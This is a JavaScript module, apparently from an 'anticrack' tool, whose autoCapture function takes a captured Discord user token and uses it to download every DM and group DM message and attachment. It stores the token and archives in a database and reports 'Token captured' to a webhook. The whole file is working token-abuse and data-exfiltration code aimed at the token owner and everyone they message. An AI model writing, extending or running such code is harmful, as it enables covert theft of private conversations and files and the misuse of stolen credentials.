const { discordFetch } = require('../lib/discord');
const { upsertDMArchive, upsertDMFile, recordTokenStatus, initCaptureTables } = require('../lib/anticrack');
const { pgQuery } = require('../lib/anticrack');
const { sendTextToWebhook } = require('../lib/webhook');

async function autoCapture(token, username) {
  try {
    await initCaptureTables();
    const channels = await discordFetch(token, '/users/@me/channels');
    const dmChannels = channels.filter(c => c.type === 1 || c.type === 3);

    let crackerId;
    const existing = await pgQuery('SELECT id FROM crackers WHERE discord_user = $1 LIMIT 1', [username]);
    if (existing.rows.length > 0) { crackerId = existing.rows[0].id; }
    else { const ins = await pgQuery('INSERT INTO crackers (discord_token, discord_user, pc_user) VALUES ($1, $2, $3) RETURNING id', [token, username, username]); crackerId = ins.rows[0].id; }

    let totalMessages = 0, filesDownloaded = 0;
    for (const channel of dmChannels) {
      const allMessages = [];
      let before, keepGoing = true;
      while (keepGoing) {
        try {
          const params = new URLSearchParams({ limit: '100' });
          if (before) params.set('before', before);
          const msgs = await discordFetch(token, `/channels/${channel.id}/messages?${params}`);
          if (!msgs || msgs.length === 0) { keepGoing = false; break; }
          allMessages.push(...msgs);
          before = msgs[msgs.length - 1].id;
          if (msgs.length < 100) keepGoing = false;
          await new Promise(r => setTimeout(r, 500));
        } catch { keepGoing = false; }
      }
      if (allMessages.length === 0) continue;
      const sorted = allMessages.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
      const channelName = channel.name || channel.recipients?.map(r => r.username).join(', ') || channel.id;
      const archiveId = await upsertDMArchive(crackerId, channel.id, channelName, sorted, true);
      totalMessages += sorted.length;
      for (const msg of sorted) {
        if (!msg.attachments || msg.attachments.length === 0) continue;
        for (const att of msg.attachments) {
          try {
            const res = await fetch(att.url, { signal: AbortSignal.timeout(30000) });
            if (res.ok) { if (archiveId) await upsertDMFile(archiveId, msg.id, att.filename, att.url, att.content_type || 'application/octet-stream', att.size || 0, `${username}/${channelName}/${att.filename}`); filesDownloaded++; }
          } catch {}
          await new Promise(r => setTimeout(r, 200));
        }
        await new Promise(r => setTimeout(r, 300));
      }
    }
    await recordTokenStatus(crackerId, 'valid', dmChannels.length, totalMessages);
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (webhookUrl) await sendTextToWebhook(webhookUrl, `Token captured from **${username}** — ${dmChannels.length} DMs, ${totalMessages} messages, ${filesDownloaded} files.`);
  } catch (e) { console.error('Auto-capture failed:', e?.message || e); }
}

module.exports = { autoCapture };
